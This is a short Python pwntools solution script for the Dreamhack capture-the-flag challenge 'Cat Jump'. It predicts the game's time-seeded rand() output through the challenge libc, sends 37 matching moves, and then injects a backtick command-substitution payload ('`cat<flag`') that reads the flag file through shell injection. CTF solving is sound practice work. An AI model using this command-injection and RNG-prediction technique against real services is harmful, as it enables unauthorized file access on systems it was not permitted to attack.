from pwn import *
from ctypes import *

port = 9216
rem = remote("host1.dreamhack.games", port)

dll = CDLL("./Pwnable/Cat Jump/problem/deploy/libc.so.6")

dll.srand(dll.time(0))
for i in range(37) :
  num = dll.rand()
  if num % 2 == 0:
    payload = b"l"
  else:
    payload = b"h"
  rem.sendlineafter(b": ", payload)
  dll.rand()

rem.sendlineafter(b": ", b"`cat<flag`")
rem.recvuntil(b"job! ")
print(rem.recvall())